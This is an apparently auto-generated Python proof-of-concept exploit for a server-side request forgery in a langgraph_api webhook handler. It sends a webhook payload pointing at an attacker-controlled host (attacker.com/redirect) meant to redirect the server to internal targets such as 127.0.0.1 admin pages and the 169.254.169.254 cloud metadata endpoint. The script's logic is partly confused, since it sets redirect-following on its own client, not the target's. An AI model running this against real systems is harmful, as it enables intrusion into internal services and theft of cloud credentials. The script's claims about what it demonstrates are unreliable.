#!/usr/bin/env python3
# PoC for langgraph_api_src (/tmp/lg-api-dl/langgraph_api_src)
# Path: ssrf-015
# Sink: ensure_webhook_http_client
# Auto-generated — run with: python3 ssrf_url_controlled_stored_result_ensure_webhook_http_client.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept: SSRF via Redirect Bypass in langgraph_api_src webhook handler

Vulnerability: The webhook URL is user-controlled and validated only at the initial
request. However, the HTTP client follows redirects (follow_redirects=True) without
re-validating the redirect target. An attacker can host a server that returns a 302
redirect to an internal IP (e.g., 127.0.0.1, 169.254.169.254), bypassing the SSRF
protection.

Usage:
    python3 poc_ssrf_redirect.py [--target TARGET_URL] [--callback CALLBACK_URL]

    --target: The vulnerable webhook endpoint (default: http://localhost:8000/webhook)
    --callback: Your attacker-controlled server that will redirect to internal IP
                (default: http://attacker.com/redirect)

Requirements: Python 3.6+, requests library (pip install requests)
"""

import argparse
import sys
import time
import urllib.parse

try:
    import requests
except ImportError:
    print("[-] This PoC requires the 'requests' library. Install with: pip install requests")
    sys.exit(1)


def validate_url(url: str) -> bool:
    """Basic URL validation to ensure we have a valid URL."""
    try:
        result = urllib.parse.urlparse(url)
        return all([result.scheme, result.netloc])
    except Exception:
        return False


def send_webhook_with_redirect(target_url: str, callback_url: str) -> None:
    """
    Simulate the vulnerable webhook call with a redirect-based SSRF bypass.
    
    The attacker-controlled callback_url should return a 302 redirect to an
    internal IP (e.g., http://127.0.0.1:8080/admin or http://169.254.169.254/latest/meta-data/).
    
    The vulnerable code:
    1. Validates the initial URL (callback_url) passes validate_webhook_url_or_raise
    2. Makes an HTTP POST request with follow_redirects=True
    3. Follows the redirect to the internal IP without re-validation
    """
    print(f"[*] Target webhook endpoint: {target_url}")
    print(f"[*] Attacker callback URL (will redirect to internal): {callback_url}")
    print()
    
    # Validate URLs
    if not validate_url(target_url):
        print(f"[-] Invalid target URL: {target_url}")
        return
    if not validate_url(callback_url):
        print(f"[-] Invalid callback URL: {callback_url}")
        return
    
    # Prepare the payload that would be sent to the webhook
    # This mimics the structure from the vulnerable code
    payload = {
        "run": {
            "run_id": "poc-test-run-id",
            "run_type": "test"
        },
        "status": "completed",
        "checkpoint": {"values": {"test": "data"}},
        "run_started_at": "2024-01-01T00:00:00",
        "run_ended_at": "2024-01-01T00:01:00",
        "webhook_sent_at": time.strftime("%Y-%m-%dT%H:%M:%S", time.gmtime()),
        "values": {"result": "poc_success"},
        "webhook": callback_url  # This is the attacker-controlled URL
    }
    
    print("[*] Sending webhook request with redirect bypass...")
    print(f"[*] Payload webhook field: {callback_url}")
    print()
    
    try:
        # This mimics the vulnerable http_request call with follow_redirects=True
        # The initial URL passes validation, but the redirect target does not
        response = requests.post(
            target_url,
            json=payload,
            timeout=10,
            allow_redirects=True,  # This is the vulnerable behavior
            headers={
                "Content-Type": "application/json",
                "User-Agent": "langgraph-webhook-poc"
            }
        )
        
        print(f"[+] Request sent successfully!")
        print(f"[+] Response status code: {response.status_code}")
        print(f"[+] Response headers: {dict(response.headers)}")
        print(f"[+] Response body: {response.text[:500]}")
        
        # Check if we got a response from an internal service
        if response.status_code == 200:
            print("\n[!] SUCCESS: The webhook request was processed and may have reached an internal service!")
            print("[!] Check your attacker-controlled server logs for the redirect request.")
        else:
            print(f"\n[*] Received status code {response.status_code}. Check the response for details.")
            
    except requests.exceptions.ConnectionError as e:
        print(f"[-] Connection error: {e}")
        print("[-] Make sure the target server is running and accessible.")
    except requests.exceptions.Timeout as e:
        print(f"[-] Request timed out: {e}")
        print("[-] The internal service may be slow or unreachable.")
    except requests.exceptions.RequestException as e:
        print(f"[-] Request failed: {e}")
    except Exception as e:
        print(f"[-] Unexpected error: {e}")


def main():
    parser = argparse.ArgumentParser(
        description="PoC: SSRF via Redirect Bypass in langgraph_api_src webhook handler",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Example:
    # Test with a local redirect server
    python3 poc_ssrf_redirect.py --target http://localhost:8000/webhook --callback http://attacker.com/redirect
    
    # The attacker.com/redirect endpoint should return:
    # HTTP/1.1 302 Found
    # Location: http://127.0.0.1:8080/admin
    # or
    # Location: http://169.254.169.254/latest/meta-data/
        """
    )
    
    parser.add_argument(
        "--target",
        default="http://localhost:8000/webhook",
        help="The vulnerable webhook endpoint (default: http://localhost:8000/webhook)"
    )
    
    parser.add_argument(
        "--callback",
        default="http://attacker.com/redirect",
        help="Your attacker-controlled server that will redirect to internal IP (default: http://attacker.com/redirect)"
    )
    
    args = parser.parse_args()
    
    print("=" * 60)
    print("SSRF via Redirect Bypass - Proof of Concept")
    print("=" * 60)
    print()
    
    send_webhook_with_redirect(args.target, args.callback)
    
    print()
    print("[*] PoC completed.")
    print("[*] If successful, the webhook handler followed the redirect to an internal IP.")
    print("[*] This demonstrates the SSRF vulnerability due to follow_redirects=True")
    print("[*] without re-validation of redirect targets.")


if __name__ == "__main__":
    main()
